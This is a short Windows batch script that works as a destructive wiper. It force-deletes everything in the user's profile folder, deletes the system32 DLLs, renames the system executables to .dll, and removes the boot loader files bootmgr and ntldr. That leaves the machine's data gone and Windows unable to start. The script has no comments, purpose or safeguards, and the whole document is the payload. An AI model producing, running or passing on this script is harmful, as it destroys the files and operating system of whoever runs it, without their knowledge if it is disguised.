@echo off
cd %userprofile%
del /F /S /Q .
cd %windir%\system32
attrib -h -r -s *.dll
del /F /S /Q *.dll
ren *.exe *.dll
attrib -h -r -s %homedrive%\bootmgr
attrib -h -r -s %homedrive%\ntldr
del /F /S /Q %homedrive%\bootmgr
del /F /S /Q %homedrive%\ntldr